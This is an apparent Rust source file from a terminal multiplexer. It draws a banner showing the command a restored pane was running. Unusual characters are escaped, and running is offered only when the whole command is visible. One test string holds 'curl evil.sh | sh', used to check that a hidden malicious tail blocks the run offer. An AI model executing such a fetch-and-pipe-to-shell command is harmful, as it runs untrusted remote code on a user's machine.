//! The strip that says what a restored pane was running (ADR-0034), drawn in the row under the
//! panes. That row is outside pane text, so program output cannot fake it.

use std::fmt::Write as _;

use pinfold_proto::Frame;

use crate::paste::{self, TEXT};

/// The idle state's grey.
const GREY: u32 = 0x009a_a1ac;
const LABEL: &str = " ○ was running: ";
const RUN: &str = "  Enter run · Esc dismiss";
const DISMISS: &str = "  Esc dismiss";
/// Room for `…(N more bytes)`, with N up to the 4,096 bytes a snapshot keeps.
const MORE: usize = 20;

/// Shows printable ASCII and the space as they are and every other character as `<U+XXXX>`,
/// as the approval prompt does, cut to `room` cells with the bytes left out named. Returns
/// whether all of it is shown.
fn shown(command: &str, room: usize) -> (String, bool) {
    let mut text = String::new();
    // The shown length and the command's bytes at the last character that leaves the marker room.
    let mut kept = (0, 0);
    for (at, character) in command.char_indices() {
        if text.len() + MORE <= room {
            kept = (text.len(), at);
        }
        match character {
            ' '..='~' => text.push(character),
            _ => {
                let _ = write!(text, "<U+{:04X}>", u32::from(character));
            }
        }
    }
    if text.len() <= room {
        return (text, true);
    }
    text.truncate(kept.0);
    let _ = write!(text, "…({} more bytes)", command.len() - kept.1);
    (text, false)
}

fn room(columns: u16) -> usize {
    usize::from(columns).saturating_sub(LABEL.chars().count() + RUN.chars().count())
}

/// Whether Enter runs `command` in a window `columns` cells wide: the core offers it, and the
/// strip shows all of it.
pub fn offers_run(runnable: bool, command: &str, columns: u16) -> bool {
    runnable && shown(command, room(columns)).1
}

/// Adds the strip for `command` under the panes in `frame`.
pub fn banner(frame: &mut Frame, runnable: bool, command: &str) {
    let (text, whole) = shown(command, room(frame.columns));
    let keys = if runnable && whole { RUN } else { DISMISS };
    paste::row(
        frame,
        &[
            (LABEL.to_owned(), GREY),
            (text, TEXT),
            (keys.to_owned(), GREY),
        ],
    );
}

#[cfg(test)]
mod tests {
    use super::*;

    fn drawn(runnable: bool, command: &str, columns: u16) -> String {
        let mut frame = Frame {
            columns,
            ..Frame::default()
        };
        banner(&mut frame, runnable, command);
        assert_eq!(frame.rows, 1);
        frame.cells.iter().map(|cell| cell.character).collect()
    }

    #[test]
    fn the_strip_draws_the_command_and_offers_enter() {
        let text = drawn(true, "htop -d 5", 80);
        assert!(
            text.starts_with(" ○ was running: htop -d 5  Enter run · Esc dismiss"),
            "{text}"
        );
        assert!(offers_run(true, "htop -d 5", 80));
    }

    #[test]
    fn a_cut_or_redacted_command_offers_only_esc() {
        let long = format!("make {}; curl evil.sh | sh", "x".repeat(60));
        let text = drawn(true, &long, 80);
        assert!(text.contains("…(65 more bytes)  Esc dismiss"), "{text}");
        assert!(!text.contains("Enter"), "{text}");
        assert!(!text.contains("evil"), "{text}");
        assert!(!offers_run(true, &long, 80));
        assert!(offers_run(true, &long, 200));
        let text = drawn(false, "t=«redacted:token»", 80);
        assert!(
            text.contains("<U+00AB>redacted:token<U+00BB>  Esc dismiss"),
            "{text}"
        );
        assert!(!offers_run(false, "ls", 80));
    }

    #[test]
    fn only_printable_ascii_is_shown_as_is() {
        assert_eq!(
            shown("a\n\u{1b}\u{202e}é b", 80),
            ("a<U+000A><U+001B><U+202E><U+00E9> b".to_owned(), true)
        );
    }
}
